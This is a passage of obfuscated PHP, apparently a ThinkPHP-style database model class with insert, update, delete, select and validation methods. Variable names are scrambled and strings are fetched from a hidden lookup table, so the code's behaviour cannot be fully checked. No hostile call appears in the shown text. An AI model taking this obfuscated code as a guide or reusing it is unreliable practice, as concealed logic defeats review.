!in_array($Ÿ²ãä¯É, $this->fields, !0)) { unset($µ„²ôş[$Ÿ²ãä¯É]); } elseif (is_scalar($•ŞÔòåÅ)) { $this->_parseType($µ„²ôş, $Ÿ²ãä¯É); } } } if (!empty($this->options[$®Œƒ´éé[358]])) { $µ„²ôş = array_map($this->options[$®Œƒ´éé[358]], $µ„²ôş); unset($this->options[$®Œƒ´éé[358]]); } $this->_beforeWrite($µ„²ôş); return $µ„²ôş; } protected function _beforeWrite(&$³™¼ş™¿) { } public function add($¾÷Å´”¤ = '', $å£Û€è« = array(), $Ú–ÖÚ˜´ = false) { if (empty($¾÷Å´”¤)) { if (!empty($this->data)) { $¾÷Å´”¤ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[‘ÆÜ‘œ][359]); return !1; } } $å£Û€è« = $this->_parseOptions($å£Û€è«); $¾÷Å´”¤ = $this->_facade($¾÷Å´”¤); if (!1 === $this->_beforeInsert($¾÷Å´”¤, $å£Û€è«)) { return !1; } $ô§ëµ²æ = $this->db->insert($¾÷Å´”¤, $å£Û€è«, $Ú–ÖÚ˜´); if (!1 !== $ô§ëµ²æ) { $É„¯úïƒ = $this->getLastInsID(); if ($É„¯úïƒ) { $¾÷Å´”¤[$this->getPk()] = $É„¯úïƒ; $this->_after_insert($¾÷Å´”¤, $å£Û€è«); return $É„¯úïƒ; } $this->_after_insert($¾÷Å´”¤, $å£Û€è«); } return $ô§ëµ²æ; } protected function _beforeInsert(&$û‡ÒÚüÆ, $ñ“Ã¹”ş) { } protected function _after_insert($„„»²Óš, $´Ç¨šö­) { } public function addAll($Û˜‰…ÇÆ, $˜ëâÕÛ± = array(), $¡Ş¤†äº = false) { $âŠ¹ûÔ÷ =& $_SERVER[‘ÆÜ‘œ]; if (empty($Û˜‰…ÇÆ)) { $this->error = think_lang($âŠ¹ûÔ÷[359]); return !1; } $˜ëâÕÛ± = $this->_parseOptions($˜ëâÕÛ±); foreach ($Û˜‰…ÇÆ as $½¿Ê¨Ú² => $¤º„”òŒ) { $Û˜‰…ÇÆ[$½¿Ê¨Ú²] = $this->_facade($¤º„”òŒ); } if (method_exists($this->db, $âŠ¹ûÔ÷[360])) { $å¸±Ô÷õ = $this->db->insertAll($Û˜‰…ÇÆ, $˜ëâÕÛ±, $¡Ş¤†äº); } else { $this->startTrans(); foreach ($Û˜‰…ÇÆ as $½¿Ê¨Ú² => $¤º„”òŒ) { $å¸±Ô÷õ = $this->db->insert($¤º„”òŒ, $˜ëâÕÛ±, $¡Ş¤†äº); } $this->commit(); } if (!1 !== $å¸±Ô÷õ) { $Œ­àòóã = $this->getLastInsID(); if ($Œ­àòóã) { return $Œ­àòóã; } } return $å¸±Ô÷õ; } public function selectAdd($¶çÇİÎ = '', $˜®±¯ôï = '', $¨çæÉ­ = array()) { $ÔÖüªÜÏ =& $_SERVER[‘ÆÜ‘œ]; $¨çæÉ­ = $this->_parseOptions($¨çæÉ­); if (!1 === ($”õİùù = $this->db->selectInsert($¶çÇİÎ ? $¶çÇİÎ : $¨çæÉ­[$ÔÖüªÜÏ[361]], $˜®±¯ôï ? $˜®±¯ôï : $this->getTableName(), $¨çæÉ­))) { $this->error = think_lang($ÔÖüªÜÏ[362]); return !1; } else { return $”õİùù; } } public function save($•×ÁíĞî = '', $Û½Ò»·’ = array()) { $Ù¸®˜¬È =& $_SERVER[‘ÆÜ‘œ]; if (empty($•×ÁíĞî)) { if (!empty($this->data)) { $•×ÁíĞî = $this->data; $this->data = array(); } else { $this->error = think_lang($Ù¸®˜¬È[359]); return !1; } } $•×ÁíĞî = $this->_facade($•×ÁíĞî); $Û½Ò»·’ = $this->_parseOptions($Û½Ò»·’); $ŸŠãŸ¾¯ = $this->getPk(); if (!isset($Û½Ò»·’[$Ù¸®˜¬È[363]])) { if (isset($•×ÁíĞî[$ŸŠãŸ¾¯])) { $çÎª¹Èğ[$ŸŠãŸ¾¯] = $•×ÁíĞî[$ŸŠãŸ¾¯]; $Û½Ò»·’[$Ù¸®˜¬È[363]] = $çÎª¹Èğ; unset($•×ÁíĞî[$ŸŠãŸ¾¯]); } else { $this->error = think_lang($Ù¸®˜¬È[362]); return !1; } } if (is_array($Û½Ò»·’[$Ù¸®˜¬È[363]]) && isset($Û½Ò»·’[$Ù¸®˜¬È[363]][$ŸŠãŸ¾¯])) { $Ä•“öî = $Û½Ò»·’[$Ù¸®˜¬È[363]][$ŸŠãŸ¾¯]; } if (!1 === $this->_beforeUpdate($•×ÁíĞî, $Û½Ò»·’)) { return !1; } $¬»Ğ±´õ = $this->db->update($•×ÁíĞî, $Û½Ò»·’); if (!1 !== $¬»Ğ±´õ) { if (isset($Ä•“öî)) { $•×ÁíĞî[$ŸŠãŸ¾¯] = $Ä•“öî; } $this->_afterUpdate($•×ÁíĞî, $Û½Ò»·’); } return $¬»Ğ±´õ; } protected function _beforeUpdate(&$‡ô©âä£, $Ï£îãÅ€) { } protected function _afterUpdate($­ œ¬²¬, $ –ïê§š) { } public function delete($­ëó¼ = array()) { $·‡ÅÓ–Î =& $_SERVER[‘ÆÜ‘œ]; if (empty($­ëó¼) && empty($this->options[$·‡ÅÓ–Î[363]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $À¾£Úµá = $this->getPk(); if (is_numeric($­ëó¼) || is_string($­ëó¼)) { if (strpos($­ëó¼, $·‡ÅÓ–Î[50])) { $¡ó·«‡[$À¾£Úµá] = array($·‡ÅÓ–Î[364], $­ëó¼); } else { $¡ó·«‡[$À¾£Úµá] = $­ëó¼; } $this->options[$·‡ÅÓ–Î[363]] = $¡ó·«‡; } $­ëó¼ = $this->_parseOptions(); if (is_array($­ëó¼[$·‡ÅÓ–Î[363]]) && isset($­ëó¼[$·‡ÅÓ–Î[363]][$À¾£Úµá])) { $«ñ¡öâ‘ = $­ëó¼[$·‡ÅÓ–Î[363]][$À¾£Úµá]; } $Ô¹—¾Ì¡ = $this->db->delete($­ëó¼); if (!1 !== $Ô¹—¾Ì¡) { $³ÆËï×Ø = array(); if (isset($«ñ¡öâ‘)) { $³ÆËï×Ø[$À¾£Úµá] = $«ñ¡öâ‘; } $this->_after_delete($³ÆËï×Ø, $­ëó¼); } return $Ô¹—¾Ì¡; } protected function _after_delete($ış€’¾¶, $Ì“–ÀîŞ) { } public function select($Ú’ÁŞ¼§ = array()) { $ØôÂÌÖ£ =& $_SERVER[‘ÆÜ‘œ]; if (is_string($Ú’ÁŞ¼§) || is_numeric($Ú’ÁŞ¼§)) { $‡äîäÈò = $this->getPk(); if (strpos($Ú’ÁŞ¼§, $ØôÂÌÖ£[50])) { $ÅÁİÀ¯[$‡äîäÈò] = array($ØôÂÌÖ£[364], $Ú’ÁŞ¼§); } else { $ÅÁİÀ¯[$‡äîäÈò] = $Ú’ÁŞ¼§; } $this->options[$ØôÂÌÖ£[363]] = $ÅÁİÀ¯; } elseif (!1 === $Ú’ÁŞ¼§) { $Ú’ÁŞ¼§ = $this->_parseOptions(); return $ØôÂÌÖ£[365] . $this->db->buildSelectSql($Ú’ÁŞ¼§) . $ØôÂÌÖ£[366]; } $Ú’ÁŞ¼§ = $this->_parseOptions(); $Ï¾¦´Ø§ = $this->db->select($Ú’ÁŞ¼§); if (!1 === $Ï¾¦´Ø§) { return !1; } if (empty($Ï¾¦´Ø§)) { return null; } $this->_afterSelect($Ï¾¦´Ø§, $Ú’ÁŞ¼§); return $Ï¾¦´Ø§; } protected function _afterSelect(&$ö×ÅÄ¥Á, $ÎŸé¨†Æ) { } public function buildSql($ïé´¡Æ = array()) { $ùê–Óà =& $_SERVER[‘ÆÜ‘œ]; $ïé´¡Æ = $this->_parseOptions($ïé´¡Æ); return $ùê–Óà[365] . $this->db->buildSelectSql($ïé´¡Æ) . $ùê–Óà[366]; } public function optionsValue($¿ß¼®×â = null) { if (is_null($¿ß¼®×â)) { return $this->options; } elseif (is_array($¿ß¼®×â)) { $this->options = array_merge($this->options, $¿ß¼®×â); } } protected function _parseOptions($ë’×İÀ‘ = array()) { $æ‹ÖŸ‹ä =& $_SERVER[‘ÆÜ‘œ]; if (is_array($ë’×İÀ‘)) { $ë’×İÀ‘ = array_merge($this->options, $ë’×İÀ‘); } $this->options = array(); if (!isset($ë’×İÀ‘[$æ‹ÖŸ‹ä[367]])) { $ë’×İÀ‘[$æ‹ÖŸ‹ä[367]] = $this->getTableName(); $ Ìº°©ñ = $this->fields; } else { $ Ìº°©ñ = $this->getDbFields(); } if (!empty($ë’×İÀ‘[$æ‹ÖŸ‹ä[368]])) { $ë’×İÀ‘[$æ‹ÖŸ‹ä[367]] .= $æ‹ÖŸ‹ä[53] . $ë’×İÀ‘[$æ‹ÖŸ‹ä[368]]; } $ë’×İÀ‘[$æ‹ÖŸ‹ä[369]] = $this->name; if (isset($ë’×İÀ‘[$æ‹ÖŸ‹ä[363]]) && is_array($ë’×İÀ‘[$æ‹ÖŸ‹ä[363]]) && !empty($ Ìº°©ñ) && !isset($ë’×İÀ‘[$æ‹ÖŸ‹ä[370]]) && !isset($ë’×İÀ‘[$æ‹ÖŸ‹ä[367]])) { foreach ($ë’×İÀ‘[$æ‹ÖŸ‹ä[363]] as $À¼ÄŒ’’ => $Å»Î¶·) { $À¼ÄŒ’’ = trim($À¼ÄŒ’’); if (in_array($À¼ÄŒ’’, $ Ìº°©ñ, !0)) { if (is_scalar($Å»Î¶·)) { $this->_parseType($ë’×İÀ‘[$æ‹ÖŸ‹ä[363]], $À¼ÄŒ’’); } } elseif (!is_numeric($À¼ÄŒ’’) && $æ‹ÖŸ‹ä[11] != substr($À¼ÄŒ’’, 0, 1) && !1 === strpos($À¼ÄŒ’’, $æ‹ÖŸ‹ä[10]) && !1 === strpos($À¼ÄŒ’’, $æ‹ÖŸ‹ä[347]) && !1 === strpos($À¼ÄŒ’’, $æ‹ÖŸ‹ä[213]) && !1 === strpos($À¼ÄŒ’’, $æ‹ÖŸ‹ä[285])) { unset($ë’×İÀ‘[$æ‹ÖŸ‹ä[363]][$À¼ÄŒ’’]); } } } $this->_options_filter($ë’×İÀ‘); return $ë’×İÀ‘; } protected function _options_filter(&$©î¨÷èÄ) { } protected function _parseType(&$’ëï¨©ç, $¨ãè Ê–) { $¿â§ÕÎ =& $_SERVER[‘ÆÜ‘œ]; if (empty($this->options[$¿â§ÕÎ[371]][$¿â§ÕÎ[4] . $¨ãè Ê–])) { $ÅåÜÅ× = strtolower($this->fields[$¿â§ÕÎ[339]][$¨ãè Ê–]); if (!1 !== strpos($ÅåÜÅ×, $¿â§ÕÎ[372])) { } elseif (!1 === strpos($ÅåÜÅ×, $¿â§ÕÎ[373]) && !1 !== strpos($ÅåÜÅ×, $¿â§ÕÎ[374])) { $’ëï¨©ç[$¨ãè Ê–] = intval($’ëï¨©ç[$¨ãè Ê–]); } elseif (!1 !== strpos($ÅåÜÅ×, $¿â§ÕÎ[375]) || !1 !== strpos($ÅåÜÅ×, $¿â§ÕÎ[376])) { $’ëï¨©ç[$¨ãè Ê–] = floatval($’ëï¨©ç[$¨ãè Ê–]); } elseif (!1 !== strpos($ÅåÜÅ×, $¿â§ÕÎ[377])) { $’ëï¨©ç[$¨ãè Ê–] = (bool) $’ëï¨©ç[$¨ãè Ê–]; } } } public function find($¡İ„îóŠ = array()) { $È¦è¹»§ =& $_SERVER[‘ÆÜ‘œ]; if (is_numeric($¡İ„îóŠ) || is_string($¡İ„îóŠ)) { $äÌÚ†­[$this->getPk()] = intval($¡İ„îóŠ); $this->options[$È¦è¹»§[363]] = $äÌÚ†­; } $this->options[$È¦è¹»§[378]] = 1; $¡İ„îóŠ = $this->_parseOptions(); $¾û€ÛÊÕ = $this->db->select($¡İ„îóŠ); if (!1 === $¾û€ÛÊÕ) { return !1; } if (empty($¾û€ÛÊÕ)) { return null; } $ÂûĞƒ˜À = $¾û€ÛÊÕ[0]; $this->_afterFind($ÂûĞƒ˜À, $¡İ„îóŠ); return $ÂûĞƒ˜À; } protected function _afterFind(&$êş¢­‚«, $Ï µÒØß) { } protected function returnResult($‡ÅñòË¾, $£ÌÜ«Ùš = '') { $Í®È¹Ñõ =& $_SERVER[‘ÆÜ‘œ]; if ($£ÌÜ«Ùš) { if (is_callable($£ÌÜ«Ùš)) { return call_user_func($£ÌÜ«Ùš, $‡ÅñòË¾); } switch (strtolower($£ÌÜ«Ùš)) { case $Í®È¹Ñõ[379]: return json_encode($‡ÅñòË¾); case $Í®È¹Ñõ[380]: return xml_encode($‡ÅñòË¾); } } return $‡ÅñòË¾; } public function parseFieldsMap($âÍ¥óêä, $±Ñç†ÇÁ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Ã´±¢¥ï => $»çñº“) { if ($±Ñç†ÇÁ == 1) { if (isset($âÍ¥óêä[$»çñº“])) { $âÍ¥óêä[$Ã´±¢¥ï] = $âÍ¥óêä[$»çñº“]; unset($âÍ¥óêä[$»çñº“]); } } else { if (isset($âÍ¥óêä[$Ã´±¢¥ï])) { $âÍ¥óêä[$»çñº“] = $âÍ¥óêä[$Ã´±¢¥ï]; unset($âÍ¥óêä[$Ã´±¢¥ï]); } } } } return $âÍ¥óêä; } public function setField($ÈÕ’±Æ¥, $Å…ç£Ø„ = '') { if (is_array($ÈÕ’±Æ¥)) { $Ø’ûäì– = $ÈÕ’±Æ¥; } else { $Ø’ûäì–[$ÈÕ’±Æ¥] = $Å…ç£Ø„; } return $this->save($Ø’ûäì–); } public function setAdd($Ç‚åÍÃõ, $á‹ûŞµ– = 1) { $í‡Í¼û =& $_SERVER[‘ÆÜ‘œ]; $øÔä—Íê = $Ç‚åÍÃõ . $í‡Í¼û[381] . $á‹ûŞµ–; if ($á‹ûŞµ– < 0) { $øÔä—Íê = $Ç‚åÍÃõ . $á‹ûŞµ–; } return $this->setField($Ç‚åÍÃõ, array($í‡Í¼û[382], $øÔä—Íê)); } public function getField($Çúòİ†Ì, $‚˜¡üê = null) { $¾Ê““¢à =& $_SERVER[‘ÆÜ‘œ]; $“­úÕÔ·[$¾Ê““¢à[361]] = $Çúòİ†Ì; $“­úÕÔ· = $this->_parseOptions($“­úÕÔ·); $Çúòİ†Ì = trim($Çúòİ†Ì); if (strpos($Çúòİ†Ì, $¾Ê““¢à[50])) { if (!isset($“­úÕÔ·[$¾Ê““¢à[378]])) { $“­úÕÔ·[$¾Ê““¢à[378]] = is_numeric($‚˜¡üê) ? $‚˜¡üê : $¾Ê““¢à[12]; } $Èä¥¿©¨ = $this->db->select($“­úÕÔ·); if (!empty($Èä¥¿©¨)) { $‡†·™Û˜ = explode($¾Ê““¢à[50], $Çúòİ†Ì); $Çúòİ†Ì = array_keys($Èä¥¿©¨[0]); $Ô Œ¬®· = array_shift($Çúòİ†Ì); $óŞÈµç = array_shift($Çúòİ†Ì); $’ÎÛÇš¢ = array(); $¸ÏƒúÒ‘ = count($‡†·™Û˜); foreach ($Èä¥¿©¨ as $í’ıµÅ) { $—ö´ÏôÈ = $í’ıµÅ[$Ô Œ¬®·]; if (2 == $¸ÏƒúÒ‘) { $’ÎÛÇš¢[$—ö´ÏôÈ] = $í’ıµÅ[$óŞÈµç]; } else { $’ÎÛÇš¢[$—ö´ÏôÈ] = is_string($‚˜¡üê) ? implode($‚˜¡üê, $í’ıµÅ) : $í’ıµÅ; } } return $’ÎÛÇš¢; } } else { if (!0 !== $‚˜¡üê) { $“­úÕÔ·[$¾Ê““¢à[378]] = is_numeric($‚˜¡üê) ? $‚˜¡üê : 1; } if ($‚˜¡üê === $¾Ê““¢à[342]) { unset($“­úÕÔ·[$¾Ê““¢à[378]]); } $í’ıµÅ = $this->db->select($“­úÕÔ·); if (!empty($í’ıµÅ)) { if ($‚˜¡üê === $¾Ê““¢à[342]) { return reset($í’ıµÅ[0]); } if (!0 !== $‚˜¡üê && 1 == $“­úÕÔ·[$¾Ê““¢à[378]]) { return reset($í’ıµÅ[0]); } foreach ($í’ıµÅ as $Å²ú©ñĞ) { $ËïÁä“ó[] = $Å²ú©ñĞ[$Çúòİ†Ì]; } return $ËïÁä“ó; } } return null; } public function create($ÌŸß÷Óú = '', $Şê ‚Óİ = '') { $‰Ì’çÁ• =& $_SERVER[‘ÆÜ‘œ]; if (empty($ÌŸß÷Óú)) { $ÌŸß÷Óú = $_POST; } elseif (is_object($ÌŸß÷Óú)) { $ÌŸß÷Óú = get_object_vars($ÌŸß÷Óú); } if (empty($ÌŸß÷Óú) || !is_array($ÌŸß÷Óú)) { $this->error = think_lang($‰Ì’çÁ•[359]); return !1; } $ÌŸß÷Óú = $this->parseFieldsMap($ÌŸß÷Óú, 0); $Şê ‚Óİ = $Şê ‚Óİ ? $Şê ‚Óİ : (!empty($ÌŸß÷Óú[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$‰Ì’çÁ•[361]])) { $‡´»õ§ö = $this->options[$‰Ì’çÁ•[361]]; unset($this->options[$‰Ì’çÁ•[361]]); } elseif ($Şê ‚Óİ == THINK_MODEL_INSERT && isset($this->insertFields)) { $‡´»õ§ö = $this->insertFields; } elseif ($Şê ‚Óİ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $‡´»õ§ö = $this->updateFields; } if (isset($‡´»õ§ö)) { if (is_string($‡´»õ§ö)) { $‡´»õ§ö = explode($‰Ì’çÁ•[50], $‡´»õ§ö); } if (think_config($‰Ì’çÁ•[383])) { $‡´»õ§ö[] = think_config($‰Ì’çÁ•[384]); } foreach ($ÌŸß÷Óú as $§ÁÂ÷‡î => $ûÒÈ¢Î’) { if (!in_array($§ÁÂ÷‡î, $‡´»õ§ö)) { unset($ÌŸß÷Óú[$§ÁÂ÷‡î]); } } } if (!$this->autoValidation($ÌŸß÷Óú, $Şê ‚Óİ)) { return !1; } if (!$this->autoCheckToken($ÌŸß÷Óú)) { $this->error = think_lang($‰Ì’çÁ•[385]); return !1; } if ($this->autoCheckFields) { $‡´»õ§ö = $this->getDbFields(); foreach ($ÌŸß÷Óú as $§ÁÂ÷‡î => $ûÒÈ¢Î’) { if (!in_array($§ÁÂ÷‡î, $‡´»õ§ö)) { unset($ÌŸß÷Óú[$§ÁÂ÷‡î]); } elseif (MAGIC_QUOTES_GPC && is_string($ûÒÈ¢Î’)) { $ÌŸß÷Óú[$§ÁÂ÷‡î] = stripslashes($ûÒÈ¢Î’); } } } $this->autoOperation($ÌŸß÷Óú, $Şê ‚Óİ); $this->data = $ÌŸß÷Óú; return $ÌŸß÷Óú; } public function autoCheckToken($İ¶Ûï) { $´³öšè‡ =& $_SERVER[‘ÆÜ‘œ]; if (isset($this->options[$´³öšè‡[386]]) && !$this->options[$´³öšè‡[386]]) { return !0; } if (think_config($´³öšè‡[383])) { $ğè¢­ñ¢ = think_config($´³öšè‡[384]); if (!isset($İ¶Ûï[$ğè¢­ñ¢]) || Session::get($ğè¢­ñ¢)) { return !1; } list($…Ñ‹â­ü, $± £²ßå) = explode($´³öšè‡[11], $İ¶Ûï[$ğè¢­ñ¢]); if ($± £²ßå && Session::get($ğè¢­ñ¢ . $´³öšè‡[10] . $…Ñ‹â­ü) === $± £²ßå) { Session::remove($ğè¢­ñ¢ . $´³öšè‡[10] . $…Ñ‹â­ü); return !0; } if (think_config($´³öšè‡[387])) { Session::remove($ğè¢­ñ¢ . $´³öšè‡[10] . $…Ñ‹â­ü); } return !1; } return !0; } public function regex($ĞğöÁ½, $”²ŒŞç®) { $ÀÄşòæÏ =& $_SERVER[‘ÆÜ‘œ]; $ÕæŸ£½ = array($ÀÄşòæÏ[388] => $ÀÄşòæÏ[389], $ÀÄşòæÏ[390] => $ÀÄşòæÏ[391], $ÀÄşòæÏ[392] => $ÀÄşòæÏ[393], $ÀÄşòæÏ[394] => $ÀÄşòæÏ[395], $ÀÄşòæÏ[396] => $ÀÄşòæÏ[397], $ÀÄşòæÏ[398] => $ÀÄşòæÏ[399], $ÀÄşòæÏ[400] => $ÀÄşòæÏ[401], $ÀÄşòæÏ[376] => $ÀÄşòæÏ[402], $ÀÄşòæÏ[403] => $ÀÄşòæÏ[404]); if (isset($ÕæŸ£½[strtolower($”²ŒŞç®)])) { $”²ŒŞç® = $ÕæŸ£½[strtolower($”²ŒŞç®)]; } return preg_match($”²ŒŞç®, $ĞğöÁ½) === 1; } private function autoOperation(&$ñöåÛãç, $ÓÅÒ´Øé) { $À÷ º‰Ü =& $_SERVER[‘ÆÜ‘œ]; if (!empty($this->options[$À÷ º‰Ü[405]])) { $äí à¶½ = $this->options[$À÷ º‰Ü[405]]; unset($this->options[$À÷ º‰Ü[405]]); } elseif (!empty($this->_auto)) { $äí à¶½ = $this->_auto; } if (isset($äí à¶½)) { foreach ($äí à¶½ as $€ö„Š¡Š) { if (empty($€ö„Š¡Š[2])) { $€ö„Š¡Š[2] = THINK_MODEL_INSERT; } if ($ÓÅÒ´Øé == $€ö„Š¡Š[2] || $€ö„Š¡Š[2] == THINK_MODEL_BOTH) { switch (trim($€ö„Š¡Š[3])) { case $À÷ º‰Ü[406]: case $À÷ º‰Ü[407]: $“ÚŠ½¥‹ = isset($€ö„Š¡Š[4]) ? (array) $€ö„Š¡Š[4] : array(); if (isset($ñöåÛãç[$€ö„Š¡Š[0]])) { array_unshift($“ÚŠ½¥‹, $ñöåÛãç[$€ö„Š¡Š[0]]); } if ($À÷ º‰Ü[406] == $€ö„Š¡Š[3]) { $ñöåÛãç[$€ö„Š¡Š[0]] = call_user_func_array($€ö„Š¡Š[1], $“ÚŠ½¥‹); } else { $ñöåÛãç[$€ö„Š¡Š[0]] = call_user_func_array(array(&$this, $€ö„Š¡Š[1]), $“ÚŠ½¥‹); } break; case $À÷ º‰Ü[361]: $ñöåÛãç[$€ö„Š¡Š[0]] = $ñöåÛãç[$€ö„Š¡Š[1]]; break; case $À÷ º‰Ü[408]: if ($À÷ º‰Ü[12] === $ñöåÛãç[$€ö„Š¡Š[0]]) { unset($ñöåÛãç[$€ö„Š¡Š[0]]); } break; case $À÷ º‰Ü[409]: default: $ñöåÛãç[$€ö„Š¡Š[0]] = $€ö„Š¡Š[1]; } if (!1 === $ñöåÛãç[$€ö„Š¡Š[0]]) { unset($ñöåÛãç[$€ö„Š¡Š[0]]); } } } } return $ñöåÛãç; } protected function autoValidation($…‘€¹ü², $ï”ŠÒ°ğ) { $˜º÷ É =& $_SERVER[‘ÆÜ‘œ]; if (!empty($this->options[$˜º÷ É[410]])) { $œ®¿µ–‘ = $this->options[$˜º÷ É[410]]; unset($this->options[$˜º÷ É[410]]); } elseif (!empty($this->_validate)) { $œ®¿µ–‘ = $this->_validate; } if (isset($œ®¿µ–‘)) { if ($this->patchValidate) { $this->error = array(); } foreach ($œ®¿µ–‘ as $†¥ÃÌ—Í => $˜œ¼¿«ï) { if (empty($˜œ¼¿«ï[5]) || $˜œ¼¿«ï[5] == THINK_MODEL_BOTH || $˜œ¼¿«ï[5] == $ï”ŠÒ°ğ) { if (0 == strpos($˜œ¼¿«ï[2], $˜º÷ É[411]) && strpos($˜œ¼¿«ï[2], $˜º÷ É[412])) { $˜œ¼¿«ï[2] = think_lang(substr($˜œ¼¿«ï[2], 2, -1)); } $˜œ¼¿«ï[3] = isset($˜œ¼¿«ï[3]) ? $˜œ¼¿«ï[3] : THINK_EXISTS_VALIDATE; $˜œ¼¿«ï[4] = isset($˜œ¼¿«ï[4]) ? $˜œ¼¿«ï[4] : $˜º÷ É[413]; switch ($˜œ¼¿«ï[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($…‘€¹ü², $˜œ¼¿«ï)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($˜º÷ É[12] != trim($…‘€¹ü²[$˜œ¼¿«ï[0]])) { if (!1 === $this->_validationField($…‘€¹ü², $˜œ¼¿«ï)) { return !1; } } break; default: if (isset($…‘€¹ü²[$˜œ¼¿«ï[0]])) { if (!1 === $this->_validationField($…‘€¹ü², $˜œ¼¿«ï)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($¸ÓêÌœÓ, $£†À‡ÜÂ) { if (!1 === $this->_validationFieldItem($¸ÓêÌœÓ, $£†À‡ÜÂ)) { if ($this->patchValidate) { $this->error[$£†À‡ÜÂ[0]] = $£†À‡ÜÂ[2]; } else { $this->error = $£†À‡ÜÂ[2]; return !1; } } return; } protected function _validationFieldItem($À¶¢ÌÏ¢, $ê¿ä•©) { $–Ó¨°’Ğ =& $_SERVER[‘ÆÜ‘œ]; switch (strtolower(trim($ê¿ä•©[4]))) { case $–Ó¨°’Ğ[406]: case $–Ó¨°’Ğ[407]: $º•Ùğ•ä = isset($ê¿ä•©[6]) ? (array) $ê¿ä•©[6] : array(); if (is_string($ê¿ä•©[0]) && strpos($ê¿ä•©[0], $–Ó¨°’Ğ[50])) { $ê¿ä•©[0] = explode($–Ó¨°’Ğ[50], $ê¿ä•©[0]); } if (is_array($ê¿ä•©[0])) { foreach ($ê¿ä•©[0] as $ÄÊ™°¸Ø) { $“âóØ™[$ÄÊ™°¸Ø] = $À¶¢ÌÏ¢[$ÄÊ™°¸Ø]; } array_unshift($º•Ùğ•ä, $“âóØ™); } else { array_unshift($º•Ùğ•ä, $À¶¢ÌÏ¢[$ê¿ä•©[0]]); } if ($–Ó¨°’Ğ[406] == $ê¿ä•©[4]) { return call_user_func_array($ê¿ä•©[1], $º•Ùğ•ä); } else { return call_user_func_array(array(&$this, $ê¿ä•©[1]), $º•Ùğ•ä); } case $–Ó¨°’Ğ[414]: return $À¶¢ÌÏ¢[$ê¿ä•©[0]] == $À¶¢ÌÏ¢[$ê¿ä•©[1]]; case $–Ó¨°’Ğ[415]: if (is_string($ê¿ä•©[0]) && strpos($ê¿ä•©[0], $–Ó¨°’Ğ[50])) { $ê¿ä•©[0] = explode($–Ó¨°’Ğ[50], $ê¿ä•©[0]); } $Ö»İÅ¤ = array(); if (is_array($ê¿ä•©[0])) { foreach ($ê¿ä•©[0] as $ÄÊ™°¸Ø) { $Ö»İÅ¤[$ÄÊ™°¸Ø] = $À¶¢ÌÏ¢[$ÄÊ™°¸Ø]; } } else { $Ö»İÅ¤[$ê¿ä•©[0]] = $À¶¢ÌÏ¢[$ê¿ä•©[0]]; } if (!empty($À¶¢ÌÏ¢[$this->getPk()])) { $Ö»İÅ¤[$this->getPk()] = array($–Ó¨°’Ğ[416], $À¶¢ÌÏ¢[$this->getPk()]); } if ($this->where($Ö»İÅ¤)->find()) { return !1; } return !0; default: return $this->check($À¶¢ÌÏ¢[$ê¿ä•©[0]], $ê¿ä•©[1], $ê¿ä•©[4]); } } public function check($¦ğÁî¶ñ, $Á›ø‚‰¶, $ñ…ÒŠ»ø = "\162\x65\147\145\x78") { $ª‹ÃÎí” =& $_SERVER[‘ÆÜ‘œ]; $ñ…ÒŠ»ø = strtolower(trim($ñ…ÒŠ»ø)); switch ($ñ…ÒŠ»ø) { case $ª‹ÃÎí”[7]: case $ª‹ÃÎí”[417]: $«ĞÒ›Ì = is_array($Á›ø‚‰¶) ? $Á›ø‚‰¶ : explode($ª‹ÃÎí”[50], $Á›ø‚‰¶); return $ñ…ÒŠ»ø == $ª‹ÃÎí”[7] ? in_array($¦ğÁî¶ñ, $«ĞÒ›Ì) : !in_array($¦ğÁî¶ñ, $«ĞÒ›Ì); case $ª‹ÃÎí”[418]: case $ª‹ÃÎí”[419]: if (is_array($Á›ø‚‰¶)) { $­ƒËá…ç = $Á›ø‚‰¶[0]; $Âšéı÷ç = $Á›ø‚‰¶[1]; } else { list($­ƒËá…ç, $Âšéı÷ç) = explode($ª‹ÃÎí”[50], $Á›ø‚‰¶); } return $ñ…ÒŠ»ø == $ª‹ÃÎí”[418] ? $¦ğÁî¶ñ >= $­ƒËá…ç && $¦ğÁî¶ñ <= $Âšéı÷ç : $¦ğÁî¶ñ < $­ƒËá…ç || $¦ğÁî¶ñ > $Âšéı÷ç; case $ª‹ÃÎí”[420]: case $ª‹ÃÎí”[421]: return $ñ…ÒŠ»ø == $ª‹ÃÎí”[420] ? $¦ğÁî¶ñ == $Á›ø‚‰¶ : $¦ğÁî¶ñ != $Á›ø‚‰¶; case $ª‹ÃÎí”[422]: $èÇæî¬† = mb_strlen($¦ğÁî¶ñ, $ª‹ÃÎí”[423]); if (strpos($Á›ø‚‰¶, $ª‹ÃÎí”[50])) { list($­ƒËá…ç, $Âšéı÷ç) = explode($ª‹ÃÎí”[50], $Á›ø‚‰¶); return $èÇæî¬† >= $­ƒËá…ç && $èÇæî¬† <= $Âšéı÷ç; } else { return $èÇæî¬† == $Á›ø‚‰¶; } case $ª‹ÃÎí”[424]: list($”ûÕÆ¼‘, $ÚîçòÆ³) = explode($ª‹ÃÎí”[50], $Á›ø‚‰¶); if (!is_numeric($”ûÕÆ¼‘)) { $”ûÕÆ¼‘ = strtotime($”ûÕÆ¼‘); } if (!is_numeric($ÚîçòÆ³)) { $ÚîçòÆ³ = strtotime($ÚîçòÆ³); } return NOW_TIME >= $”ûÕÆ¼‘ && NOW_TIME <= $ÚîçòÆ³; case $ª‹ÃÎí”[425]: return in_array(get_client_ip(), explode($ª‹ÃÎí”[50], $Á›ø‚‰¶)); case $ª‹ÃÎí”[426]: return !in_array(get_client_ip(), explode($ª‹ÃÎí”[50], $Á›ø‚‰¶)); case $ª‹ÃÎí”[413]: default: return $this->regex($¦ğÁî¶ñ, $Á›ø‚‰¶); } } public function query($ÀÙ¢ïùµ, $·›‚˜äü = false) { $„‡îşµã =& $_SERVER[‘ÆÜ‘œ]; if (!is_bool($·›‚˜äü) && !is_array($·›‚˜äü)) { $·›‚˜äü = func_get_args(); array_shift($·›‚˜äü); } $ÀÙ¢ïùµ = str_replace(array($„‡îşµã[286], $„‡îşµã[427]), 